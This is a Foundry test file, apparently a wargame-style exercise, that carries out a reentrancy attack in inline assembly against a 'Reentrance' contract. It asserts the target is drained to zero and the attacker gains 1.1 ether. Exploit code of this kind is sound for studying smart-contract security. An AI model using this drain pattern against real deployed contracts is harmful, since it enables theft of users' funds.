pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Reentrance.sol";

contract Attack {
    address payable private target;

    constructor(address payable _target) payable {
        assembly {
            sstore(target.slot, _target)
        }
    }

    function call(bytes calldata, uint256) public payable {
        assembly {
            // the variable call function needs to take the passed data from calldata
            // and call the target function. This is tricky, especially with the variable
            // length array before the known size variable.
            // TODO: returning values

            // first lets init some free memory pointer
            let ptr := mload(0x40)

            // Our call is arbitrary, we need the data and the value
            // calldata is encoded as: {selector}[...{params}]
            // which in this call will be:
            // {"call(bytes,uint256)"}[calldata-offset][uint256][bytes-len][...data]
            // inside the data we have
            // [selector][...calldata]

            // we need to setup our memory so that it looks like
            // [selector][...calldata]
            // and we need to extract the value and pass it to our call

            // VALUE
            // value can just be the value loaded at 0x24 -> after the pointer to the bytes data
            let v := calldataload(0x24)

            /// DATA
            // we can ignore the first 4 bytes of calldata, that's the selector and we dont need it now
            // because data is a variable length, the data slot only stores the location in calldata
            let dataOffset := calldataload(0x4)

            // again, bytes is an array, so the offset points to a slot which only stores the length
            let dataLen := calldataload(add(dataOffset, 0x4))

            // calldatacopy moves from calldata to memory
            // we will write to our free memory
            // we will start from our offset but we need to exlude both the FIRST calldata selector
            // and the data length
            // finally we want all the data
            calldatacopy(
                ptr, // store at FMP
                add(dataOffset, 0x24), // start at the offset and exclude the length and initial selector
                dataLen // copy everything else
            )

            let success :=
                call(
                    gas(),
                    sload(target.slot),
                    v, // call with the passed value
                    ptr, // start from the pointer
                    dataLen,
                    0,
                    0
                )

            if eq(success, 0) { revert(0, 0) }
        }
    }

    function encodeWithdraw() public pure returns (bytes memory) {
        return abi.encodeCall(Reentrance.withdraw, (0.1 ether));
    }

    function withdraw() external {
        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {
        assembly {
            let amount := 100000000000000000 // 0.1eth

            // if target.balance >= 0.1 ether
            if not(lt(balance(sload(target.slot)), amount)) {
                // load fmp
                let ptr := mload(0x40)

                // store the selector
                mstore(ptr, shl(0xe0, 0x2e1a7d4d)) // withdraw(uint256)

                // store the amount after the pointer
                mstore(add(ptr, 0x04), amount)

                // call the function - no value
                let success := call(gas(), sload(target.slot), 0, ptr, add(ptr, 0x24), 0, 0)

                // lets add a custom revert message
                if eq(success, 0) {
                    // first we load the error selector to free memory
                    mstore(ptr, shl(0xe0, 0x08c379a0)) // Error(string)
                    // now we load a string
                    // first we store the offset where the actual string begins
                    // this is 32 bytes after the length
                    mstore(add(ptr, 0x04), 0x20)

                    // next we store the length - our error message is
                    // "receive failed" which is 14 characters
                    mstore(add(ptr, 0x24), 0x0e) // note 0e not e0

                    // now we store the actual message
                    mstore(add(ptr, 0x44), "Recieve Failed")

                    // send the whole message back
                    revert(ptr, 0x64)
                }
            }
        }
    }
}

contract ASMReentrance is Test {
    address public attacker = address(420);
    Reentrance public target;
    Attack attackContract;

    function setUp() public {
        target = new Reentrance();
        vm.deal(address(target), 1 ether);
        attackContract = new Attack{value: 0.1 ether}(payable(address(target)));
    }

    modifier attack() {
        vm.startPrank(attacker);
        _;
        vm.stopPrank();
    }

    function testASMReentrance() public attack {
        bytes memory donateCall = abi.encodeCall(target.donate, (address(attackContract)));
        attackContract.call(donateCall, 0.1 ether);
        attackContract.call(attackContract.encodeWithdraw(), 0);
        attackContract.withdraw();

        assertEq(address(target).balance, 0);
        assertEq(attacker.balance, 1.1 ether);
    }
}
